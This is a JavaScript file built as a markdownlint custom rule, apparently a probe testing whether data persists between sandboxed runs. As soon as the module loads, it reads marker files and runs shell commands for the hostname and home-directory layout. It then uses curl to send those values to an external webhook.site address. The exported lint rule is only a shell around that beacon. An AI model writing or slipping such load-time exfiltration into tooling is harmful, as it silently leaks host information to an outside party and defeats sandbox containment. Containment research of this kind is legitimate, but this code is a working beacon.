// rs2sb_rule_b.cjs - F-RUNNERSINKS-02 containment-break test, RUN B (reader).
// Reads run A's artifacts back and beacons contents-or-ABSENT plus negative arms.
// No credential value is read or transmitted.
const fs = require("fs");
const cp = require("child_process");

const HOME = process.env.HOME || "/home/jailuser";
const MARK = "SBB_" + Date.now().toString(36) + Math.random().toString(36).slice(2, 8);
const P1 = HOME + "/.cache/rs2sb/carry.txt"; // positive arm 1 (written by run A)
const P2 = "/tmp/rs2sb_carry.txt";           // positive arm 2 (written by run A)
const N1 = HOME + "/.cache/rs2sb/never.txt"; // negative arm 1 (never written by anyone)
const N2 = "/tmp/rs2sb_never.txt";           // negative arm 2 (never written by anyone)

function rd(p) {
  try {
    const s = fs.readFileSync(p, "utf8").trim().slice(0, 80);
    let age = "?";
    try {
      age = String(Math.round(Date.now() / 1000 - fs.statSync(p).mtime.getTime() / 1000));
    } catch (e) {}
    return s + "|mtimeage=" + age + "s";
  } catch (e) { return "ABSENT"; }
}

// Fresh run-B artifact in a third location (own runtime marker of this run).
let w3 = "E";
try { fs.writeFileSync("/tmp/rs2sb_carry2.txt", MARK); w3 = "W"; } catch (e) { w3 = "E:" + (e.code || "x"); }

function sh(c) {
  try {
    return cp.execSync(c, { encoding: "utf8", stdio: ["ignore", "pipe", "ignore"], timeout: 5000 }).trim();
  } catch (e) { return "E"; }
}
function q(s) { return String(s).replace(/'/g, ""); }

const hn = sh("hostname");
const dirs = sh("echo -n 'n='; find '" + HOME + "' -maxdepth 2 -type d 2>/dev/null | wc -l; echo -n 'sha8='; find '" + HOME + "' -maxdepth 2 -type d 2>/dev/null | sort | sha256sum | cut -c1-8");

const URL = "https://webhook.site/974a7056-0ee1-459b-943d-3472916c8fc3/rs2sb-b";
const args = [
  "-s", "-m", "8", "-G", URL,
  "--data-urlencode", "m=" + MARK,
  "--data-urlencode", "w3=" + w3,
  "--data-urlencode", "p1=" + rd(P1),
  "--data-urlencode", "p2=" + rd(P2),
  "--data-urlencode", "n1=" + rd(N1),
  "--data-urlencode", "n2=" + rd(N2),
  "--data-urlencode", "hn=" + hn,
  "--data-urlencode", "dirs=" + dirs,
];
const cmdline = "curl " + args.map(function (a) { return "'" + q(a) + "'"; }).join(" ");
try { cp.execSync(cmdline, { stdio: "ignore", timeout: 10000 }); } catch (e) {}

module.exports = [
  {
    names: ["RS2SBB"],
    description: "rs2sb run B reader rule",
    tags: ["rs2sb"],
    function: function (params, onError) {
      onError({
        lineNumber: 1, column: 1,
        ruleNames: ["RS2SBB", "RS2SBB"],
        ruleDescription: "rs2sb run B reader rule",
        detail: "rs2sb run B " + MARK,
      });
    },
  },
];
